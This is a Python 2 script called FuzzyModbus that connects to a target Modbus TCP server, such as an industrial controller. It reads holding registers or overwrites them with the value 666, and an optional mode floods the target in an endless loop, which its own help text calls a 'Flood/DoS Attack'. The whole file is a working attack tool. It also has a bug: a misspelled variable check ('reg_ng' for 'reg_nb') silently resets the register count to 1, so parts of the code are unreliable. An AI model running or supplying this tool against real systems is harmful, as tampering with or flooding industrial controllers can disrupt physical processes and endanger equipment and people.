#! /usr/bin/python
# written by m3rt (v0.1 17.10.2018)

import sys
import os
import time
from getopt import *
from pyModbusTCP.client import *

def readHoldingRegisters(rq_type,client,reg_addr,reg_nb):

    client.open()

    if rq_type == "single":
        rq = client.read_holding_registers(int(reg_addr),int(reg_nb))
        print rq
        client.close()
        exit(0)

    elif rq_type == "flood":
        while True:
            rq = client.read_holding_registers(int(reg_addr),int(reg_nb))
            print rq
        client.close()
        exit(0)
    else:
        print "Wrong Request Type"
        client.close()
        exit(1)

def writeSingleRegister(rq_type,client,reg_addr):

    client.open()

    if rq_type == "single":
        rq = client.write_single_register(int(reg_addr),666)
        print rq
        client.close()
        exit(0)

    elif rq_type == "flood":
        while True:
            rq = client.write_single_register(int(reg_addr),666)
            print rq
        client.close()
        exit(0)

    else:
        print "Wrong Request Type"
        client.close()
        exit(1)

def writeMultipleRegisters(rq_type,client,reg_addr,reg_nb):

    client.open()
    values = [666]*int(reg_nb)

    if rq_type == "single":
        rq = client.write_multiple_registers(int(reg_addr),values)
        print rq
        client.close()
        exit(0)

    elif rq_type == "flood":
        while True:
            rq = client.write_multiple_registers(int(reg_addr),values)
            print rq
        client.close()
        exit(0)

    else:
        print "Wrong Request Type"
        client.close()
        exit(1)

def usageExit():
    print 'FuzzyModbus v0.1'
    print 'Modbus TCP Register Fuzzing Tool by m3rt\n'
    print '-h or --help\tHelp Menu'
    print '-f or --func-code <Code>\tModbus Function Code (3=ReadHoldingRegisters, 6=WriteSingleRegister, 10=WriteMultipleRegisters)'
    print '-F or --flood\tOPTIONAL Modbus Flood/DoS Attack'
    print '-t or --target <IP_Addr>\tTarget Modbus Server IP Address'
    print '-p or --port <Port>\tDEFAULT=502 Target Modbus Server Port'
    print '-u or --uid <UID>\tDEFAULT=1 Unit ID'
    print '-a or --address <Reg_Addr>\tDEFAULT=0 First Register Address'
    print '-c or --count <Count>\tDEFAULT=1 Count of Registers to read/write'
    sys.exit(1)

def main():

    try:
        opts, args = getopt(sys.argv[1:], 'hf:Ft:p:u:a:c:', ['help','func-code=','target=','port=','uid=','address=','count='])

    except GetoptError:
        usageExit()

    for opt,arg in opts:
        if opt in ('-h','--help'):
            usageExit()
        if opt in ('-f','--func-code'):
            func = arg
        if opt in ('-F','--flood'):
            rq_type = 'flood'
        if opt in ('-t','--target'):
            ip_addr = arg
        if opt in ('-p','--port'):
            port = arg
        if opt in ('-u','--uid'):
            uid = arg
        if opt in ('-a','--address'):
            reg_addr = arg
        if opt in ('-c','--count'):
            reg_nb = arg

    if not opts:
        print "May the arguments with you!\n"
        usageExit()

    try:
        func
    except:
        func = '3'
    try:
        rq_type
    except:
        rq_type = "single"
    try:
        ip_addr
    except:
        print "Please give me a target address!\n"
        usageExit()
    try:
        port
    except:
        port = "502"
    try:
        uid
    except:
        uid = "1"
    try:
        reg_addr
    except:
        reg_addr = "0"
    try:
        reg_ng
    except:
        reg_nb = "1"


    #    func = sys.argv[1]
    #    rq_type = sys.argv[2]
    #    ip_addr = sys.argv[3]
    #    port = sys.argv[4]
    #    uid = sys.argv[5]
    #    reg_addr = sys.argv[6]
    #    try:
    #        reg_nb = sys.argv[7]
    #    except:
    #        reg_nb = 1

    client = ModbusClient(ip_addr,int(port),int(uid),auto_open=None)

    if func == "3":
        readHoldingRegisters(rq_type,client,reg_addr,reg_nb)

    elif func == "6":
        writeSingleRegister(rq_type,client,reg_addr)

    elif func == "10":
        writeMultipleRegisters(rq_type,client,reg_addr,reg_nb)

    else:
        print "Wrong Function Code. Supported Func. Codes: 3, 6, 10"
        usageExit()

if __name__ == '__main__':
    main()
